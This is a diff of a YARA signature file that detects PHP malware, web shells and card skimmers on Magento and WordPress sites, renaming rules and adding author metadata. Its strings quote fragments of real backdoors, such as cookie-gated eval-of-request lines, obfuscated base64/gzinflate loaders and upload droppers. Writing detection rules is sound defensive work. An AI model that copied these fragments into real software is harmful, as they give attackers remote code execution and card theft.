 		hash = "e5b7ff2839fee50529aa7f1901afa09f5e8eeaa1efe8780178c16b824ade1e62"
 	strings:
 		$s0 = "kr';$___=isset($_POST['___'])?$_POST['___']:(isset($_COOKIE['___'])?$_COOKIE['___']:NULL);if($___!==NULL){$___=md5($___).substr(" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 46KB and all of them
 }
-rule YarGen_index_inc
+rule index_inc
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index.inc.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "d01efe92733e53c7363de6fdd38c192c67da5a6bcac3d328074b73fcaf37ae44"
 	strings:
 		$s0 = "<title>PHProxy</title>" fullword ascii
 	condition:
 		uint16(0) == 0xbbef and filesize < 1KB and all of them
 }
-rule YarGen_banners_html
+rule banners_html
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file banners.html.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "e6ec160a6e2910b0cce6d46c3e8db7ba37a4a170fb1e4e2f625bd3bbbd7ae327"
 	strings:
 		$s0 = "{setcookie($plim, $_POST['pass'], time()+3600);}" fullword ascii
@@ -1000,13 +930,11 @@ rule YarGen_banners_html
 	condition:
 		uint16(0) == 0x3f3c and filesize < 46KB and all of them
 }
-rule YarGen_js_hack
+rule js_hack
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - from files index_packaged2.js, index_packaged.js"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		super_rule = 1
 		hash1 = "75f7e1558d02d339b5848ba0294ce809157ce41974af9169fec111616124302f"
 		hash2 = "ab9ed9628492a7b02c86d90cb873aa66c85e79b9bb569e9cf0530616222cf772"
@@ -1035,13 +963,11 @@ rule YarGen_js_hack
 	condition:
 		uint16(0) == 0x6628 and filesize < 726KB and all of them
 }
-rule YarGen_index_php_hack
+rule index_php_hack
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - from files index.php, index.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		super_rule = 1
 		hash1 = "f695f725cec1ad8d1a7e7e114472597d5c721b07bed2570117d09da40ca75bfa"
 		hash2 = "f695f725cec1ad8d1a7e7e114472597d5c721b07bed2570117d09da40ca75bfa"
@@ -1070,13 +996,11 @@ rule YarGen_index_php_hack
 	condition:
 		uint16(0) == 0x3f3c and filesize < 117KB and all of them
 }
-rule YarGen_php_backdoor
+rule system_php_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file System.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "c66dd474cd71b436184ef6be5e44da598cdc50b450b7fc53318a0cd9c9821712"
 	strings:
 		$s0 = "if(isset($_POST)&& $GLOBALS['_1101968086_'][0]($_POST)&& $GLOBALS['_1101968086_'][1]($_POST)>round(0)){$_0=_361192170(0);$_1=$_S" ascii
@@ -1088,13 +1012,11 @@ rule YarGen_php_backdoor
 	condition:
 		uint16(0) == 0x3f3c and filesize < 9KB and all of them
 }
-rule YarGen__cache27
+rule cache27
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file cache27.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "952f75e2583b64ed0351d67a3bf01f120c2e06ed55a5021a48f6a2cdea4dbea5"
 	strings:
 		$s0 = "$GLOBALS[$GLOBALS['re5a857a'][19].$GLOBALS['re5a857a'][63].$GLOBALS['re5a857a'][50].$GLOBALS['re5a857a'][14]] = $_POST;" fullword ascii
@@ -1113,26 +1035,22 @@ rule YarGen__cache27
 	condition:
 		uint16(0) == 0x3f3c and filesize < 40KB and all of them
 }
-rule YarGen__skins
+rule skins_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file skins.php2"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "cda14815d2768cf119e59ea5e8aa1905775c923c79caba03ed25b440163b3e98"
 	strings:
 		$s0 = "<?php if(md5(@$_COOKIE[qz])=='8b9376de1361eebe603afc6565d65394') ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_lib55
+rule lib55_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file lib55.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "8e2fb996a26804ca06d777cfaaa1385e7d6853b9d11693c7f3bb0abcb4e2e99d"
 	strings:
 		$s0 = "$GLOBALS[$GLOBALS['f81f0aa'][67].$GLOBALS['f81f0aa'][87].$GLOBALS['f81f0aa'][59].$GLOBALS['f81f0aa'][45].$GLOBALS['f81f0aa'][36]" ascii
@@ -1149,13 +1067,11 @@ rule YarGen_lib55
 	condition:
 		uint16(0) == 0x3f3c and filesize < 40KB and all of them
 }
-rule YarGen_start_backdoor
+rule start_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file start.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "8ed9c5674a9589e72869a10d079bda6cbfc270487623f501255e3fe2971f5f72"
 	strings:
 		$s0 = "$GLOBALS[$GLOBALS['qf0761d'][16].$GLOBALS['qf0761d'][5].$GLOBALS['qf0761d'][14].$GLOBALS['qf0761d'][92].$GLOBALS['qf0761d'][5].$" ascii
@@ -1173,26 +1089,22 @@ rule YarGen_start_backdoor
 	condition:
 		uint16(0) == 0x3f3c and filesize < 40KB and all of them
 }
-rule YarGen_image_backdoor
+rule image_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file image.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "26c18ec0723763cc19ad8749d73b256f507bf5445ef503798a3fe88f675a4553"
 	strings:
 		$s0 = "<?php eval(base64_decode('aWYoaXNzZXQoJF9QT1NUWydlJ10pKWV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpO2VjaG8gJzM5MzgyYjMxMzIzOTJlMz" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_IndexController_shoplift
+rule IndexController_shoplift
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file IndexController.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "739fc6d5013c8dab2c6ed76a2e82d20006a3f46399fe5aa88ef6ae9a3783a3de"
 	strings:
 		$s0 = "$method = $auth_cookie(@$_COOKIE['zbyxbcfwojbufkqz2']);" fullword ascii
@@ -1203,26 +1115,22 @@ rule YarGen_IndexController_shoplift
 	condition:
 		uint16(0) == 0x630a and filesize < 1KB and all of them
 }
-rule YarGen_load_config
+rule load_config
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file load-config.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "87889eb903223d0effc7fe169bf78e276ce605b1575d7609540e10ee6bc048e2"
 	strings:
 		$s0 = "<?php $a = \"b\".\"\".\"as\".\"e\".\"\".\"\".\"6\".\"4\".\"_\".\"de\".\"\".\"c\".\"o\". \"\".\"d\".\"e\"; assert($a('ZXZhbCgiXHg" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 107KB and all of them
 }
-rule YarGen_joom
+rule joom_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file joom.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "88a7486147582b54bc19ca2d6e3dec1b2b40122028fd0666c16179ac01d09676"
 	strings:
 		$s0 = "$GLOBALS['_trh_']=Array(base64_decode('ZXJyb3JfcmVwb3J0aW5n'),base64_decode('ZmlsZV9wdXRfY29udGVudHM='),base64_decode('YmFzZTY0X" ascii
@@ -1230,13 +1138,11 @@ rule YarGen_joom
 	condition:
 		uint16(0) == 0x3f3c and filesize < 68KB and all of them
 }
-rule YarGen_test68
+rule test68
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file test68.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "3ef425274b9d0caefea13c6aa366a0bff14ec4573ed16d73f79a9c3fc8de5e60"
 	strings:
 		$s0 = "$GLOBALS[$GLOBALS['y1939d'][76].$GLOBALS['y1939d'][29].$GLOBALS['y1939d'][96].$GLOBALS['y1939d'][7].$GLOBALS['y1939d'][64].$GLOB" ascii
@@ -1255,46 +1161,26 @@ rule YarGen_test68
 	condition:
 		uint16(0) == 0x3f3c and filesize < 39KB and all of them
 }
-rule YarGen_index_php
+rule index_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index.php.js"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "c0c04e6e48c13adaf7430af12c6fb3f1d365339d7d4e26599aa514e726b85e38"
 	strings:
-		$s0 = "* http://www.magentocommerce.com/license/enterprise-edition" fullword ascii
-		$s1 = "* @license     http://www.magentocommerce.com/license/enterprise-edition" fullword ascii
-		$s2 = "* needs please refer to http://www.magentocommerce.com for more information." fullword ascii
-		$s3 = "* @copyright   Copyright (c) 2014 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
-		$s4 = "* @author      Magento Core Team <core@magentocommerce.com>" fullword ascii
-		$s5 = "* to license@magentocommerce.com so we can send you a copy immediately." fullword ascii
-		$s6 = "* Proxy script to combine and compress one or few files for JS and CSS" fullword ascii
-		$s7 = "if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) >= $lastModified) {" fullword ascii
-		$s8 = "* This source file is subject to the Magento Enterprise Edition License" fullword ascii
-		$s9 = "if($_POST['hsh']=='ae014ad623c4493b9a2704383269c7f5'){$c = $_POST['c']; $js = $_POST['js'];" fullword ascii
-		$s10 = "* versions in the future. If you wish to customize Magento for your" fullword ascii
-		$s11 = "// optional custom content type, can be emulated by index.php/x.js or x.css" fullword ascii
-		$s12 = "* Restricts access only to files under current script's folder" fullword ascii
-		$s13 = "* Do not edit or add to this file if you wish to upgrade Magento to newer" fullword ascii
-		$s14 = "* that is bundled with this package in the file LICENSE_EE.txt." fullword ascii
-		$s15 = "* Magento Enterprise Edition" fullword ascii
-		$s16 = "// try automatically get content type if requested" fullword ascii
-		$s17 = "if (empty($contentTypes[$fileExt])) { // security" fullword ascii
-		$s18 = "* obtain it through the world-wide-web, please send an email" fullword ascii
-		$s19 = "$contentType = $_GET['c']==='auto' ? true : $_GET['c'];" fullword ascii
-		$s20 = "$out .= file_get_contents($fileRealPath) . \"n\";" fullword ascii
+		$s0 = "if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) >= $lastModified) {" fullword ascii
+		$s1 = "if($_POST['hsh']=='ae014ad623c4493b9a2704383269c7f5'){$c = $_POST['c']; $js = $_POST['js'];" fullword ascii
+		$s2 = "if (empty($contentTypes[$fileExt])) { // security" fullword ascii
+		$s3 = "$contentType = $_GET['c']==='auto' ? true : $_GET['c'];" fullword ascii
+		$s4 = "$out .= file_get_contents($fileRealPath) . \"n\";" fullword ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 13KB and all of them
 }
-rule YarGen_openid
+rule openid
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file OpenIDOpenID.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "3a1116b00f7da2723fe926ea4a30173c35ae9cfce84bf39f2c6f57a4cd3fdf0f"
 	strings:
 		$s0 = "$sQHE=$bq8Ze(\"7X1re9s2z/Dn9V_wmjfZq+PYTtu7s2Mn&Q5t2jTp_ugp6ePJsmxrkS1PkuNkWf77C4CkREqy43S738N1v*ufp7FIEARJkARBAHT7xRVnNIlui4XO6" ascii
@@ -1304,13 +1190,11 @@ rule YarGen_openid
 	condition:
 		uint16(0) == 0x240a and filesize < 68KB and all of them
 }
-rule YarGen_class
+rule class
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file class.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "d310bca7bd58aab6c9565f88461d7d04ec67ad5fba1fc0ae4fd71bb5f3705a27"
 	strings:
 		$s0 = "echo \"<form method=post name=mf style='display:none;'><input type=hidden name=c></form>\";" fullword ascii
@@ -1337,26 +1221,22 @@ rule YarGen_class
 	condition:
 		uint16(0) == 0x3f3c and filesize < 7KB and all of them
 }
-rule YarGen_skins_2
+rule skins_2
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file skins.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "2ed85107292b5a48dedad17c7ce91cef796a93c98ce4e25485efe7cb35b8f058"
 	strings:
 		$s0 = "<?php if(md5(@$_COOKIE[qz])=='b98e9adf0deb0c5a95191af3eba27d09') ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_Cc
+rule Cc_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file Cc.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "2dcbd0b85875444db7b542f0c158f125d0d4fbc1ad943b86f86583b54e144c3c"
 	strings:
 		$s0 = "$data17 = json_decode(file_get_contents(\"http://www.binlist.net/json/\".$data16.\"\"));" fullword ascii
@@ -1383,26 +1263,22 @@ rule YarGen_Cc
 	condition:
 		uint16(0) == 0x2020 and filesize < 6KB and all of them
 }
-rule YarGen_iestyles
+rule iestyles
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file iestyles.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "2852ef99bcb3150595cf7f1260871fda9225753f58db3b73b9535150ef22677e"
 	strings:
 		$s0 = "if(md5(@$_COOKIE['hsh'])=='f026c722b7b295be861e572f08677d0f')($_=@$_REQUEST['css']).@$_($_REQUEST['js']); ?>" fullword ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_user41
+rule user41
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file user41.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "56b89ce2eb29c48f65a58501e401f89f8e20a6860a3a482e1239b47d29828a30"
 	strings:
 		$s0 = "@$GLOBALS[$GLOBALS['rfc3fd88'][79].$GLOBALS['rfc3fd88'][82].$GLOBALS['rfc3fd88'][23].$GLOBALS['rfc3fd88'][27]](0);" fullword ascii
@@ -1424,13 +1300,11 @@ rule YarGen_user41
 	condition:
 		uint16(0) == 0x3f3c and filesize < 33KB and all of them
 }
-rule YarGen_sql
+rule sql
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file sql.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "f6c49280fcdc632aed89ab33ae68b64b8021402f3de7f25ebab4aecabdfc1b8c"
 	strings:
 		$s0 = "'FaLo4EgHxaLH8rjTOuQh4uFHxUZo5EYo4uFdN7GMv3F16Eye4q614uyRvawS8rLXvaLX4rG15uXp57FoBcH1v3G1v3G1v3G1'." fullword ascii
@@ -1457,13 +1331,11 @@ rule YarGen_sql
 	condition:
 		uint16(0) == 0x3f3c and filesize < 454KB and all of them
 }
-rule YarGen_bad_html
+rule bad_html
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file 57ecf5ca445625e8154131e8f560153a.htm"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "a60032a560ec799c552d139731e27f43a9c903765c951a1476af28213846cf05"
 	strings:
 		$s0 = "<a target=\"_blank\" href=\"http://www.shy22.com/upfilpng/cr078433.png\">" fullword ascii
@@ -1477,13 +1349,11 @@ rule YarGen_bad_html
 	condition:
 		uint16(0) == 0x2020 and filesize < 3KB and all of them
 }
-rule YarGen_file
+rule file_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file file.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "8a715131660a8a990d01f8ffac79cf185283c5f1191d333cb5fff7605735c3a2"
 	strings:
 		$s0 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$R_DHQjEVmhf=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'." ascii
@@ -1491,13 +1361,11 @@ rule YarGen_file
 	condition:
 		uint16(0) == 0x3f3c and filesize < 268KB and all of them
 }
-rule YarGen_index_2
+rule index_2_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index.php2"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "ddbacd2e7780f9e01516f330332ae6fbc1ed7fc8cb989ab4c6a7a79a3c4582b6"
 	strings:
 		$s0 = "eval($v3($v1(strrev('/0///973n3//5zDEAJggRQACdf1kPZVidSaW9OCq3LYtTj44VUK/M7p6QdNvtRHDkLUxYppsNoj6iB/BfcRyc8Dcrwrk+U8HNNZGdwTixGO" ascii
@@ -1507,13 +1375,11 @@ rule YarGen_index_2
 	condition:
 		uint16(0) == 0x240a and filesize < 264KB and all of them
 }
-rule YarGen_index_hack
+rule index_hack
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index.php3"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "801768e4b9c0b878628d8058abb30e93a6a9f26b652186bbfa2896ff96e62e26"
 	strings:
 		$s0 = "eval($mdh($md(strrev('/0///973n3//5zD'.'EAJggRQ'.'AC'.'df1kPZVidSaW9OC'.'q'.'3LYtTj44VUK/M7p6Q'.'dNvtRHD'.'kLUxYppsNoj6iB/Bfc'.'" ascii
@@ -1524,13 +1390,11 @@ rule YarGen_index_hack
 	condition:
 		uint16(0) == 0x6c24 and filesize < 326KB and all of them
 }
-rule YarGen_php_hack
+rule test_php_hack
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file test.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "330d7996b806be10d707b58c4f38f3b9a982841b9662a318f83eb6958e3a3b5b"
 	strings:
 		$s0 = "@$GLOBALS[$GLOBALS['t7b7'][1].$GLOBALS['t7b7'][65].$GLOBALS['t7b7'][85].$GLOBALS['t7b7'][58]](0);" fullword ascii
@@ -1556,6 +1420,8 @@ rule YarGen_php_hack
 }
 rule TiGERMTE
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="TiGER-M@TE" nocase
 
@@ -1564,6 +1430,8 @@ condition:
 }
 rule IndoXploit
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="IndoXploit" nocase
 
@@ -1572,6 +1440,8 @@ condition:
 }
 rule Backd00r
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="Backd00r"
 
@@ -1580,6 +1450,8 @@ condition:
 }
 rule magento_cc_hack_obfuscated
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="YXJkaWFuc3lhaDI1MDk5NkBnbWFpbC5jb20" nocase
 
@@ -1588,6 +1460,8 @@ condition:
 }
 rule magento_ftp_backdoor
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="$ftplogin = ftp_login($ftpConn,$ftpuser,$ftppassword);" nocase
 
@@ -1596,6 +1470,8 @@ condition:
 }
 rule php_backdoor15
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="Andela1C3" nocase
 
@@ -1604,6 +1480,8 @@ condition:
 }
 rule php_backdoor12
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="k4l0nk" nocase
 
@@ -1612,6 +1490,8 @@ condition:
 }
 rule php_backdoor14
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="Dark Shell" nocase
 
@@ -1620,6 +1500,8 @@ condition:
 }
 rule php_backdoor13
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="(Web Shell by oRb)" nocase
 
@@ -1628,6 +1510,8 @@ condition:
 }
 rule php_malware
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="r0b0t Dd0s Php" nocase
 
@@ -1636,6 +1520,8 @@ condition:
 }
 rule eval_request
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="eval(stripslashes($_REQUEST" nocase
    $2="($_=@$_REQUEST[q])" nocase
@@ -1645,6 +1531,8 @@ condition:
 }
 rule php_backdoor11
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="b374k-shell" nocase
 
@@ -1654,7 +1542,7 @@ condition:
 rule magento_cc_hack_amasty
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "possible customer login registration hack"
 		strings:
 			$1="amasty.biz"
@@ -1665,7 +1553,7 @@ rule magento_cc_hack_amasty
 rule magento_cc_hack_ebiz
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "possible customer login registration hack"
 		strings:
 			$1="ebizmart.biz"
@@ -1675,6 +1563,8 @@ rule magento_cc_hack_ebiz
 }
 rule magento_php_backdoor
 {
+meta:
+		author = "MageMojo"
 strings:
    $1="<?php $wp__l_='"
 
@@ -1683,6 +1573,8 @@ condition:
 }
 rule magento_get_backdoor
 {
+meta:
+		author = "MageMojo"
 strings:
 $1="$_POST['fack']));"
 condition:
@@ -1692,6 +1584,7 @@ any of them
 rule cookie_backdoor
 {
 meta:
+		author = "MageMojo"
  description="cookie file usually means malware in some dir"
 strings:
 $1="Netscape HTTP Cookie File"
@@ -1703,6 +1596,7 @@ any of them
 rule phpbackdoor_filesman_obfuscated
 {
 meta:
+		author = "MageMojo"
  description="backdoor shell"
 strings:
 $1="eval(gzinflate(base64_decode(strrev("
@@ -1714,6 +1608,7 @@ any of them
 rule magento_cc_hack
 {
 meta:
+		author = "MageMojo"
  description="Cc.php Hacks"
 strings:
 $1="$serverboss = $_SERVER['SERVER_NAME'];"
@@ -1751,6 +1646,7 @@ any of them
 rule wordpress_cnf
 {
 meta:
+		author = "MageMojo"
  description="backdoor shell"
 strings:
 $1="$WP__WP='base'.(128/2).'_de'"
@@ -1762,6 +1658,7 @@ any of them
 rule magento_session_php_hack
 {
 meta:
+		author = "MageMojo"
  description="backdoor shell"
 strings:
 $1="cnJvcnJwb3J0QGdtYWlsLmNvbQ"
@@ -1773,6 +1670,7 @@ all of them
 rule magento_prototype_js_injection
 {
 meta:
+		author = "MageMojo"
  description="js injection"
 strings:
 $1="this['eval'](String['fromCharCode']'"
@@ -1783,12 +1681,16 @@ any of them
 }
 rule md5_64651cede2467fdeb1b3b7e6ff3f81cb
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "rUl6QttVEP5eqf9usxfJjgoOvdNWFSGoHDgluk+4ONwXQNbGniQLttfyrgkB8d9"
     condition: any of them
 
 }
 rule fopo_webshell
 {
+meta:
+		author = "Byte.nl"
     strings: 
         $ = "DNEcHdQbWtXU3dSMDA1VmZ1c29WUVFXdUhPT0xYb0k3ZDJyWmFVZlF5Y0ZEeHV4K2FnVmY0OUtjbzhnc0"
         $ = "U3hkTVVibSt2MTgyRjY0VmZlQWo3d1VlaFJVNVNnSGZUVUhKZXdEbGxJUTlXWWlqWSt0cEtacUZOSXF4c"
@@ -1798,6 +1700,8 @@ rule fopo_webshell
 }
 rule eval_post
 {
+meta:
+		author = "Byte.nl"
     strings:
         $ = "eval(base64_decode($_POST"
         $ = "eval($undecode($tongji))"
@@ -1807,6 +1711,8 @@ rule eval_post
 }
 rule spam_mailer
 {
+meta:
+		author = "Byte.nl"
     strings:
         $ = "<strong>WwW.Zone-Org</strong>"
         $ = "echo eval(urldecode("
@@ -1815,11 +1721,15 @@ rule spam_mailer
 }
 rule md5_0105d05660329704bdb0ecd3fd3a473b
 {
+meta:
+		author = "Byte.nl"
     /*
 
 }
 rule md5_0b1bfb0bdc7e017baccd05c6af6943ea
 {
+meta:
+		author = "Byte.nl"
 	/*
 		eval(hnsqqh($llmkuhieq, $dbnlftqgr));?>
 		eval(vW91692($v7U7N9K, $v5N9NGE));?>
@@ -1830,101 +1740,137 @@ rule md5_0b1bfb0bdc7e017baccd05c6af6943ea
 }
 rule md5_2495b460f28f45b40d92da406be15627
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "$dez = $pwddir.\"/\".$real;copy($uploaded, $dez);"
     condition: any of them
 
 }
 rule md5_3ccdd51fe616c08daafd601589182d38
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "eval(xxtea_decrypt"
     condition: any of them
 
 }
 rule md5_4b69af81b89ba444204680d506a8e0a1
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "** Scam Redirector"
     condition: any of them
 
 }
 rule md5_87cf8209494eedd936b28ff620e28780
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "curl_close($cu);eval($o);};die();"
 condition: any of them
 }
 rule md5_c647e85ad77fd9971ba709a08566935d
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "fopen(\"cache.php\", \"w+\")"
     condition: any of them
 
 }
 rule md5_fb9e35bf367a106d18eb6aa0fe406437
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "0B6KVua7D2SLCNDN2RW1ORmhZRWs/sp_tilang.js"
     condition: any of them
 
 }
 rule md5_8e5f7f6523891a5dcefcbb1a79e5bbe9
 {
+meta:
+		author = "Byte.nl"
 strings: $ = "if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {echo '<b>up!!!</b><br><br>';}}"
 condition: any of them
 }
 rule indoexploit_autoexploiter
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "echo \"IndoXploit - Auto Xploiter\""
     condition: any of them
 
 }
 rule eval_base64_decode_a
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "eval(base64_decode($a));"
     condition: any of them
 
 }
 rule md5_ab63230ee24a988a4a9245c2456e4874
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "eval(gzinflate(base64_decode(str_rot13(strrev("
     condition: any of them
 
 }
 rule md5_b579bff90970ec58862ea8c26014d643
 {
+meta:
+		author = "Byte.nl"
 strings: $ = /<Files [^>]+.(jpg|png|gif)>\s*ForceType application\/x-httpd-php/
 condition: any of them
 }
 rule md5_d30b23d1224438518d18e90c218d7c8b
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "attribute_code=0x70617373776f72645f68617368"
     condition: any of them
 
 }
 rule base64_hidden_in_image
 {
+meta:
+		author = "Byte.nl"
     strings: $ = /JPEG-1\.1[a-zA-Z0-9\-\/]{32}/
 condition: any of them
 }
 rule hide_data_in_jpeg
 {
+meta:
+		author = "Byte.nl"
     strings: $ = /file_put_contents\(\$.{2,3},'JPEG-1\.1'\.base64_encode/
 condition: any of them
 }
 rule hidden_file_upload_in_503
 {
+meta:
+		author = "Byte.nl"
     strings: $ = /error_reporting(0);$f=$_FILES[w+];copy($f[tmp_name],$f[name]);error_reporting(E_ALL);/
     condition: any of them
 
 }
 rule md5_fd141197c89d27b30821f3de8627ac38
 {
+meta:
+		author = "Byte.nl"
     condition: any of them
 
 }
 rule md5_39ca2651740c2cef91eb82161575348b
 {
+meta:
+		author = "Byte.nl"
     strings: $ = /if\(md5\(@\$_COOKIE\[..\]\)=='.{32}'\) \(\$_=@\$_REQUEST\[.\]\).@\$_\(\$_REQUEST\[.\]\);/
 condition: any of them
 }
 rule md5_6eb201737a6ef3c4880ae0b8983398a9
 {
+meta:
+		author = "Byte.nl"
     strings:
         $ = "if(md5(@$_COOKIE[qz])=="
         $ = "($_=@$_REQUEST[q]).@$_($_REQUEST[z]);"
@@ -1933,60 +1879,80 @@ rule md5_6eb201737a6ef3c4880ae0b8983398a9
 }
 rule md5_d201d61510f7889f1a47257d52b15fa2
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "@eval(stripslashes($_REQUEST[q]));"
     condition: any of them
 
 }
 rule onepage_or_checkout
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74"
     condition: any of them
 
 }
 rule sinlesspleasure_com
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "5e908r948q9e605j8t9b915n5o9f8r5e5d969g9d795b4s6p8t9h9f978o8p8s9590936l6k8j9670524p7490915l5f8r90878t917f7g8p8o8p8k9c605i8d937t7m8i8q8o8q959h7p828e7r8e7q7e8m8o5g5e9199918o9g7q7c8c8t99905a5i8l94989h7r7g8i8t8m5f5o92917q7k9i9e948c919h925a5d8j915h608t8p8t9f937b7k9i9e948c919h92"
     condition: any of them
 
 }
 rule amasty_biz
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "118,97,114,32,115,110,100,32,61,110,117,108,108,59,10,10,102,117"
     condition: any of them
 
 }
 rule amasty_biz_js
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "t_p#0.qlb#0.#1Blsjj#1@#.?#.?dslargml#0.qr_pr#06#07#5@#.?#0"
     condition: any of them
 
 }
 rule returntosender
 {
+meta:
+		author = "Byte.nl"
